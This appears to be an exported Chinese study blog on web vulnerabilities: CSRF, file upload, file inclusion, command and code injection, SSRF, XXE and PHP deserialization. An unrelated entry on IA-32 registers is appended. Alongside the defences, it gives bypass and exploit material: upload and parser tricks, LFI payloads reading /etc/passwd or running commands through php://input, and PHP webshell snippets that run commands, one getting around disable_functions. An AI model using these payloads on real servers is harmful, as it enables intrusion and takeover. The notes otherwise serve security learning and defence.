CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。 四、防御方法1、 服务端的防御 主要有 5 种策略：验证 HTTP的Referer字段、在请求地址中添加 token 并验证、在 HTTP 头中自定义属性并验证、使用POST替代GET等。 （1）、验证 HTTP的Referer字段，在 HTTP 头的Referer字段记录了该 HTTP 请求的来源地址。顺便解决了非法盗链、站外提交等问题。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。 （2）、在请求地址中添加 token 并验证，可以在 HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。抵御 CSRF 攻击的关键在于：在请求中加入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。 （3）、在 HTTP 头中自定义属性并验证，也是使用 token 并进行验证，但并不是把 token以参数的形式置于 HTTP 请求而是放到 HTTP 头中自定义的属性里。通过XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了前一种方法在请求中加入 token 的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会通过 Referer 泄露到其他网站。 （4）、严格区分好 POST 与 GET 的数据请求，尽量使用POST来替代GET，如在 asp 中不要使用 Request 来直接获取数据。同时建议不要用 GET 请求来执行持久性操作。 （5）、使用验证码或者密码确认方式，缺点是用户体验差。 2、 用户端的防御 用户的安全意识与良好的上网习惯。 3、 安全设备的防御 有些厂商的安全产品能基于硬件层面对HTTP 头部的 Referer 字段内容进行检查来快速准确的识别 CSRF 攻击。 文件上传漏洞一、基本概念漏洞定义 文件上传漏洞是指由于服务器端对于用户上传部分的控制不严格导致攻击者可以上传一个恶意的文件到服务器。简单点说，就是用户直接或者通过各种绕过方式将WebShell上传到服务器中进而执行利用。 成因 导致文件上传的漏洞的原因较多，主要包括以下几类： 服务器配置不当 开源编辑器上传漏洞 本地文件上传限制被绕过 过滤不严或被绕过 文件解析漏洞导致文件执行 文件路径截断 服务器配置不当 二、文件上传攻击分类1、轻量级检测绕过攻击 （1）绕过javascript 对扩展名的检测： 使用Burpsuite等反向代理工具直接POST数据包到服务端，绕过前端检测，如DVWA中的绕过示例。 （2）绕过服务端对http request 包MIME 类型检测： 使用Burpsuite等反向代理工具伪造POST 数据包到服务端，绕过MIME检测，如DVWA中的绕过示例。 2、文件内容检测绕过攻击 文件加载测试绕过：对文件进行代码注入再配合任意解析调用/漏洞。 3、上传攻击框架漏洞分层以及路径/扩展名检测绕过攻击 轻量级检测绕过攻击 绕过javascript 对扩展名的检测 代码层漏洞 绕过服务端对http request 包MIME 类型检测 代码层漏洞 路径、扩展名检测绕过攻击 黑名单绕过 白名单绕过 文件名大小写绕过名单列表绕过特殊文件名绕过0x00截断绕过.htaccess文件攻击PHP文件包含漏洞Apache解析漏洞IIS解析漏洞Nginx解析漏洞 代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞应用层漏洞应用层漏洞应用层漏洞 0x00截断绕过PHP文件包含漏洞IIS解析漏洞Nginx解析漏洞 代码层漏洞代码层漏洞应用层漏洞应用层漏洞 4、文件内容检测绕过攻击 文件加载绕过 (代码层漏洞) 攻击手法与环节如图： 三、上传文件中的解析攻击1、直接解析（几乎没有防御） 比如直接上传一个扩展名是.php 的文件，只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。 2、配合解析(有一定程度的防御) 可以理解为先将代码注入到服务器上，上传一个带有一句话木马的图片或文件，等待一个解析的配合来实现攻击。 (1)、本地文件包含解析：主要是PHP本地文件包含 (2)、.htaccess文件解析 (3)、Web应用程序解析漏洞以及其原理： 1.Apache 解析漏洞： 解析： test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称） 描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样 一直往前尝试，直到遇到一个能解析的扩展名为止。 2.IIS 解析漏洞： 解析：test.asp/abc 或 test.asp;abc 名 或 abc/def.php （其中abc、def都为任意文件名） 描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析；IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。 3.Nginx 解析漏洞： 解析：abc/def.php 或 abc%00.php （其中abc、def都为任意文件名） 描述：目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/abc.php 的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。 4.解析漏洞总结： Apache的扩展名顺序解析漏洞：Apache自身的漏洞 IIS的asp 解析漏洞：IIS自身的漏洞 Nginx的%00 解析漏洞：Nginx自身的漏洞 php-cgi的默认配置漏洞：这类以CGI 形式调用php的web 应用程序主要出现在IIS和Nginx；而Apache 通常是以module 的形式去调用php，所以很少出现该类型漏洞。 四、检测方法简单点的方法就是直接上传各种类型的文件，再通过Burpsuite修改各个可以绕过的检测内容来检测。 五、防御方法简单的防御方法为：获取文件扩展名进行白名单对比，然后对文件进行重命名。当然若存在解析漏洞等容易被绕过，具体点的防御方法如下： 1、客户端JavaScript检测：通常为检测文件扩展名) 2、服务端MIME 类型检测：检测Content-Type内容) 3、服务端目录路径检测：检测跟path参数相关的内容 4、服务端文件扩展名检测：检测跟文件extension 相关的内容 （1） 黑名单检测： 文件名大小写绕过：如 AsP，pHp。 名单列表绕过：用黑名单里没有的名单，如 asa 或 cer 等。 特殊文件名绕过：比如发送的 http 包里把文件名改成 test.asp. 或 test.asp (后面为空格)，这种命名方式在 Windows系统里是不能直接修改的，需要在Burpsuite等代理中进行修改，然后绕过验证后，会被Windows系统自动去掉后面的点和空格，但也只能用在Windows系统中。 0x00 截断绕过 双扩展名解析绕过攻击： (1)基于Web服务的解析逻辑：如果上传一个文件名为help.asp.123，扩展名123 不在扩展名黑名单中也没在Apache 可解析扩展名列表中，此时会向前搜寻下一个可解析的扩展名，若搜寻到.php，则会以php 执行。 (2) 基于Web服务的解析方式：如果在Apache的conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是test2.php.jpg也会以php 来执行。 危险解析绕过攻击：基于Web服务的解析方式：如果在Apache 的conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是jpg，一样能以php 方式执行。 .htaccess 文件攻击：配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测。 解析调用/漏洞绕过：直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞 （2） 白名单检测： 0x00 截断绕过：如test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击 解析调用/漏洞绕过：直接配合上传一个代码注入过的白名单文件，再利用解析调用/漏洞 .htaccess文件攻击：无论是黑名单还是白名单都可以直接攻击.htaccess 文件 如果PHP 安全没配置好，就可以通过move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。 5、服务端文件内容检测(检测内容是否合法或含有恶意代码) ： （1）文件幻数检测： 主要是检测文件内容开始处的文件幻数，要绕过的话需要在文件开头写上检测的值，比如图片类型的文件幻数如下： JPG文件： GIF文件： PNG文件： 然后在文件幻数后面加上代码即可。 （2）文件相关信息检测： 图像文件相关信息检测常用的就是getimagesize()函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息，结构如下： GIF89a 123(...some binary data for image...) &lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) （3）文件加载检测： 一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，甚至是进行二次渲染（过滤效果几乎最强）。 对渲染/加载测试的攻击方式：代码注入绕过，可以用图像处理软件对一张图片进行代码注入，但文件结构是完整的，渲染测试基本上都能绕过。用winhex查看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。 对二次渲染的攻击方式：攻击文件加载器自身，常见的就是溢出攻击，上传恶意文件后服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出；二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。 示例代码： 12345678function image_gd_open(file, extension) &#123; extension = str_replace('jpg', 'jpeg', extension); open_func = 'imageCreateFrom'. extension; //函数名变成imageCreateFrompng 之类 if (!function_exists($open_func)) &#123; return FALSE; &#125; return open_func(file); //变成imagecreatefrompng('/tmp/php0lbTOn') &#125; 文件包含漏洞一、基本概念漏洞定义 简单地说，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。 这里主要针对PHP语言。 PHP中的文件包含函数 include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 文件包含漏洞的一般特征 ?page=a.php ?home=a.html ?file=content 目录遍历（Directory traversal）和文件包含（File include）的一些区别 目录遍历是可以读取web根目录以外的其他目录，根源在于web application的路径访问权限设置不严，针对的是本系统。 文件包含是通过include函数将web根目录以外的目录的文件被包含进来，分为LFI本地文件包含和RFI远程文件包含。 几种经典的测试方法 ?file=../../../../../etc/passwdd ?page=file:///etc/passwd ?home=main.cgi ?page=http://www.a.com/1.php http://1.1.1.1/../../../../dir/file.txt （通过多个../可以让目录回到根目录中然后再进入目标目录） 编码绕过字符过滤 可以使用多种编码方式进行绕过 %00嵌入任意位置 .的利用 二、文件包含漏洞的利用技巧包含漏洞上传技巧： 一般将一句话木马和图片进行绑定上传。 包含读文件： 如http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php 包含写文件： 构造URL：http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://input，并且提交POST数据为： 1&lt;?php system(&apos;net user&apos;);?&gt; 等 包含日志文件： 当存在PHP本地文件包含漏洞，但无法上传正常文件时，可以利用Apache日志文件。Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中，例如： http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log PHP内置的协议： 三、检测方法找到有包含函数的页面，对函数内容进行替换查看结果； 可以使用工具来代替手工的过程，如Kadimus、Burpsuite的插件LFI scanner checks等； 白盒测试时，可以在源代码中查看allow_url_fopen、allow_url_include等敏感函数是否开启。 四、防御方法1、严格判断包含中的参数是否外部可控。 2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。 3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。 4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：“include(“head.php”)”。 5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。 不安全的验证码一、基本概念漏洞定义 验证码问题归类为逻辑漏洞类问题，通常是开发者编写代码时存在设计缺陷、可导致某些特殊情况使得验证码可被绕过，从而使得验证码的防御机制形同虚设。 原理过程 1.客户端发起一个请求 2.服务端响应并创建一个新的 SessionID 同时生成一个随机验证码 3.服务端将验证码和 SessionID 一并返回给客户端 4.客户端提交验证码连同 SessionID 给服务端 5.服务端验证验证码同时销毁当前会话，返回给客户端结果 二、验证码的安全问题客户端问题： 1、 客户端生成验证码：验证码由客户端 JS生成并且仅仅在客户端用JS验证。 2、 验证码输出客户端：输出在HTML中，不应该把验证码的内容发送到客户端 cookie 或输出到response headers的其他字段中。 3、 验证码输出在 cookie 中：有些系统默认不显示验证码，而是在用户校验错误一定次数之后再出现。那如何判断用户已经错误几次了呢？若是如下判断： （1）在 cookie 中写入一个标记，比如 loginErr = 1，后续错误累加 （2）在 session 中写入一个标记，例如 loginErr = 1，后续错误累加 这样问题在于，要是攻击者不带 Cookie 提交 HTTP 请求或不更新 Cookie中 loginErr 的值反复提交，这样程序会因为无从获取 Cookie/sessionID，会认为攻击者是首次访问，从而验证码不会出现。 服务器端问题： 1、 验证码不过期，没有及时销毁会话导致验证码复用 2、 没有进行非空判断 3、 产生的验证码问题集内的答案非常有限 三、检测方法简单的方法，先是手工登录几次，查看是否出现验证码以及验证码是否失效，然后再通过Burpsuite来进一步测试。 四、防御方法1、 强制要求输入验证码，否则必须实施 IP 策略。注意不要被 X-Forwarded-For（用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段） 绕过了。 2、 验证码只能用一次，用完立即过期。 3、 验证码强度增强，使用扭曲、变形、干扰线条、干扰背景色、变换字体等。 4、 大网站最好统一安全验证码，各处使用同一个验证码接口。 命令注入漏洞一、基本概念漏洞定义 当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，达到任意命令执行的效果。 这里以PHP为主，以后在Java分类中会单独总结Java类的漏洞。 成因 程序未严格区分用户输入的内容是数据还是代码。 PHP与命令执行漏洞相关的函数 1、PHP的5种命令执行函数：system()、exec()、passthru()、shell_exec()、运算符 2、命令执行小集： 12345678910111213141516&lt;?phpcmd="system";ob_start(cmd);echo "_GET[cunlide]";ob_end_flush();echo "&lt;br&gt;";system("GET[cunlide]");echo "&lt;br&gt;";echo exec("$GET[cunlide]");echo "&lt;br&gt;";echo shell_exec("_GET[cunlide]");echo "&lt;br&gt;";echo passthru("GET[cunlide]");echo "&lt;br&gt;";echo `$GET[cunlide]`;?&gt; 3、PHP后门木马常用的函数类型： 执行系统命令：system, passthru, shell_exec, exec, popen, proc_open 代码执行与加密：eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13 文件包含与生成：require，require_once，include, include_once，file_get_contents, file_put_contents, fputs, fwrite.htaccess：SetHandler, auto_prepend_file, auto_append_file 二、绕过WAF的方法1、黑白名单测试绕过 2、可用符号替换 3、换行符\n 4、$IFS替换空格 三、绕过disable_functions的方法禁止 webshell 执行命令原理：PHP配置文件里的disable_functions = 配置，用来禁止某些 php 函数。 1、 黑名单绕过 2、 系统组件绕过（Windows）： 12345678&lt;?phpcommand=_POST[a];wsh = new COM('WScript.shell'); // 生成一个 COM 对象exec = wsh-&gt;exec('cmd.exe /c '.command); //调用对象方法来执行命令stdout = exec-&gt;StdOut();stroutput = stdout-&gt;ReadAll();echo $stroutput?&gt; Shell.Application 也可以实现同样的效果。 彻底的解决方案是直接删除 System32 目录下 wshom.ocx 文件。 3、 扩展库绕过：Linux下可通过编译拓展库进行绕过。 防御方法：将dl函数加入disable_function中禁用。 使用PHP突破Disable_functions执行Linux命令：linux 的 webshell 管理员禁用了exec，system，passthru，popen，shell_exec等等 PHP 执行命令函数，导致不能执行命令，php 提供了一个扩展模块功能，使用 dl 函数能包含一个扩展模块。类似.so或者想windows下的 dll 文件。可以自定义函数来调用 linux 命令而无视Disable_functions的限制。 在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给 create_function()执行任意命令。 四、检测方法基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。 基于白盒的测试：查看源代码，搜索PHP中执行系统命令的函数如system、passthru等。 五、防御方法1、尽量不要执行外部的应用程序或命令。 2、使用自定义函数或函数库实现外部应用程序或命令的功能。 3、在执行 system 等命令执行功能的函数前，确定参数内容。 4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“ ;”会被转义为“\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。 暴力破解一、基本概念漏洞定义 暴力破解其实并不算是漏洞而是设计缺陷，当页面或程序未对请求的数量进行严格的限制时，攻击者可使用字典一直暴力破解用户名密码，导致密码被破解出来的安全风险。 分类 1、C/S架构暴力破解： 主要使用的破解工具Hydra、Bruter、X-scan 2、B/S架构暴力破解： 使用Burpsuite镜像表单爆破 二、检测方法简单粗暴的方法，直接使用Burpsuite进行暴力破解，看看有没有什么防暴破的机制即可。 三、防御方法1、设置复杂的密码 2、采用验证码机制，同时可防范CSRF攻击 3、登陆日志，限制登录次数 4、调用sleep()函数，当登录失败时停止一段时间才允许再次登录，如DVWA的High级的防暴破机制 代码注入一、基本概念漏洞定义 代码注入，与命令注入类似，程序未对用户输入内容进行严格校验从而导致恶意代码注入执行，只不过是注入到特定的编程语言代码中，如PHP的eval注入、HTML页面的JS注入、OGNL注入等。 这里以PHP为主，Java代码会在Java分类中单独总结。 成因 程序未严格区分用户输入的内容是数据还是代码。 PHP中代码注入函数 eval()、assert()、preg_replace()、str_replace()、call_user_func()…等函数。 eval()函数注入攻击，将参数字符串作为PHP 程序代码来执行，用户可以将 PHP 代码保存成字符串的形式，然后传递给 eval 函数执行。 PHP中的assert()、preg_replace()、str_replace()以及call_user_func()函数同样可以实现eval 注入攻击的效果。preg_replace()函数的作用是用来执行常规表达式的查找和替换的，当替换内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。 二、绕过WAF的方法和命令注入类似。 三、检测方法基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。 基于白盒的测试：查看源代码，搜索与执行PHP代码的函数如eval、assert等。 四、防御方法1、尽量不要执行外部的应用程序或命令。 2、使用自定义函数或函数库实现外部应用程序或命令的功能。 3、在执行php中eval()等代码执行功能的函数前，确定参数内容。 4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“ ;”会被转义为“\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。 SSRF一、基本概念漏洞定义 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后服务器以他的身份来访问其他服务器的资源。 出现漏洞的常见位置 1）分享：通过URL地址分享网页内容 2）转码服务 3）在线翻译 4）图片加载与下载：通过URL地址加载或下载图片 5）图片、文章收藏功能 6）未公开的api实现以及其他调用URL的功能 7）从URL关键字中寻找 二、绕过WAF的方法主要针对URL过滤的绕过。 1、 使用@符号：我们请求http://a.com@b.com与请求http://b.com的结果是一致的； 2、 IP地址转换进制访问：如115.239.210.26 ＝ 16373751032 3、 添加端口号：http://127.0.0.1:8080 4、 使用短链接：http://dwz.cn/11SMa 三、检测方法1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞 2、在页面源码中查找访问的资源地址 ，如果该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 四、防御方法1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 3、限制请求的端口为http常用的端口，比如，80,443,8080,8090。 4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。 5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。 XML注入一、基本概念漏洞定义 XML是一种可扩展标记语言，可以理解为HTML的扩展语言，一般用于数据存储、数据传输、数据共享，其中DTD文档来解释XML文档。XML必须包含根元素，所有的标签都要闭合，对大小写敏感，并且属性值需要加引号。 XML注入即XXE（XML外部实体注入），是指利用可控的参数或入口来加载不可控的参数或代码，造成不可控的运行结果。 ENTITY实体：如果在XML文档中需要频繁使用某一条数据，可以预先给这个数据起一个别名。即一个ENTITY，然后再在文档中调用它。 XML定义了两种类型的ENTITY，一种在XML文档中使用，另一种在为参数在DTD文件中使用。 定义语法：\&lt;!DOCTYPE 文件名 [ \&lt;!ENTITY 实体名 “实体内容”&gt; ] &gt; 定义好的ENTITY在文档中通过“&amp;实体名;”来使用。 正常来说，DTD分为内部DTD与外部DTD，内部DTD包含在XML文档中,外部DTD则通过URL引用。一个DTD文件是以.dtd结尾的文本文件 。前面还要加上SYSTEM，但是如果此处没有任何过滤，我们完全可以引用系统敏感文件的，前提是页面有回显，否则你只引用了文件但不知道文件内容。 成因： Xfire使用了STAX解析XML导致XML实体注入发生。 1、直接引入XML外部实体 2、未加任何过滤直接parse 漏洞危害： 1、任意文件读取：通过外部实体引用，可以获取文件内容 2、URL请求，SSRF 3、DoS 4、远程代码执行：在PHP开启expect扩展的前提下 二、检测方法盲测：判断request的XML请求是否被解析，可以根据请求头中的“SOAP”字段来判断，也可以根据错误返回中有“SAX”字样。 漏洞挖掘总结：一般为Xfire开发的或者某些wsdl结尾的文件。 1、Service为Xfire 2、明显的XML作为内容的输入点 3、某些以JSON格式的Request 三、防御方法1、禁用外部实体 2、过滤和验证用户提交的XML数据 3、不允许XML中含有任何自己声明的DTD 4、有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可 反序列化漏洞一、基本概念漏洞定义 通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。 这里以PHP为例，Java的会在Java分类单独总结。 PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的敏感操作，则会造成PHP反序列化漏洞的风险。 serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。 unserialize()：将序列化后的字符串反序列化成一个对象。 利用前提 unserialize()函数的参数可控； 代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类； 所写的内容需要有对象中的成员变量的值。 PHP魔法函数 下面列下可能经常碰到的魔法函数，其余的查查资料也知道了。 __construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __toString()：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。 __sleep()：常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误。 _wakeup()：经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个\_wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 PHP反序列化漏洞分类 unserialize()反序列化漏洞 session反序列化漏洞 phar反序列化漏洞 二、检测方法以PHP为例，全局搜索PHP的反序列化函数如unserialize()，查看其中涉及的文件代码中是否含有魔法函数或其他危险的类方法，且进一步排查魔法函数的内容是否外界可控且存在危险操作。 三、防御方法1、要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则； 2、要对于反序列化后的变量内容进行检查，以确定内容没有被污染。 XPath注入一、基本概念漏洞定义 待完善… 二、检测方法待完善… 三、防御方法待完善… LDAP注入具体可参考技术详解：基于Web的LDAP注入漏洞 CRLF注入待完善… URL不安全重定向待完善… 点击劫持待完善… HTML5安全待完善… Web缓存攻击待完善…]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IA-32（Intel Architecture 32位）寄存器]]></title>
    <url>%2F2019%2F01%2F28%2FIA-32%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[通用寄存器用于传送和暂存数据，参与算数逻辑运算并保存运算结果。IA-32每个通用寄存器的大小都是32位，即4个字节，主要用来保存常量和地址等信息。 以下4个通用寄存器主要用于算术运算如ADD、SUB、XOR、OR等，常用于保存常量与变量的值。 EAX：（针对操作数和结果数据的）累加器，一般用在函数返回值中，所有Win32 API函数都会把返回值保存到EAX后再返回。EAX寄存器又分为高、低几个独立的寄存器，AX（0-15）为EAX（0-31）的低16位独立寄存器，而AX又分为高8位的AH（8-15）和低8位的AL（0-7）两个独立寄存器，下面的EBX、ECX和EDX同理。 EBX：（DS段中的数据指针）基址寄存器。 ECX：（字符串和循环操作的）计数器，如在循环命令LOOP中用来循环计数、每执行完一次循环ECX就自减一。 EDX：（I/O指针）数据寄存器。 以下4个通用寄存器主要用于保存内存地址的指针。 ESI：（字符串操作源指针）源变址寄存器。 EDI：（字符串操作目标指针）目的变址寄存器，ESI和EDI与特定指令（LODS、STOS、REP、MOVS等）一起使用，主要用于内存复制。 EBP：（SS段中栈内数据指针）扩展基址指针寄存器，表示栈区域的基地址，即指向栈最上面的一个栈帧的底部，函数被调用时保存ESP的值，函数返回时再把值返回ESP，保证栈不会崩溃（即栈帧技术）。 ESP：（SS段中栈指针）栈指针寄存器，指向栈区域的栈顶地址。 段寄存器在IA-32的保护模式中，段是一种内存保护技术，将内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等以保护内存。段内存记录在SDT中，而段寄存器持有这些SDT的索引。每个段寄存器的大小为16位，即2个字节，且每个段寄存器指向的段描述符与虚拟内存结合，形成一个线性地址，借助分页技术，线性地址最终被转换为实际的物理地址。 CS：Code Segment，代码段寄存器。 DS：Data Segment，数据段寄存器。 SS：Stack Segment，栈段寄存器。 ES：Extra (Data) Segment，附加（数据）段寄存器。 FS：Data Segment，数据段寄存器，在程序调试中经常用于计算SEH（结构化异常处理机制）、TEB（线程环境块）、PEB（进程环境块）。 GS：Data Segment，数据段寄存器。 其中ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。 程序状态与控制寄存器EFLAGS：Flag Register，标志寄存器，大小为4个字节即32位，每一位都有意义，有些位由系统直接设定，有些位则根据程序命令的执行结果设置。 先了解3个常用的与程序调试相关的标志，ZF（Zero Flag零标志）、OF（Overflow Flag溢出标志）、CF（Carry Flag进位标志）。 ZF：若运算结果为0，则为1（True），否则为0（False）。 OF：有符号整数溢出时，则为1。此外，MSB（最高有效位）改变时，也为1。 CF：无符号整数溢出时，则为1。 指令指针寄存器EIP：Instruction Pointer，指令指针寄存器，保存着CPU要执行的指令地址，大小为32位即4个字节。 程序运行时，CPU会读取EIP中的一条指令地址，传送指令到指令缓冲区后，EIP寄存器的值将自动增加，增加的大小为读取指令的字节大小。CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。 注意的就是，EIP寄存器和通用寄存器不同，不能直接修改EIP的值，只能通过其他指令间接修改，如JMP、Jcc、CALL、RET。也可以通过中断或者异常来修改EIP的值。]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
</search>
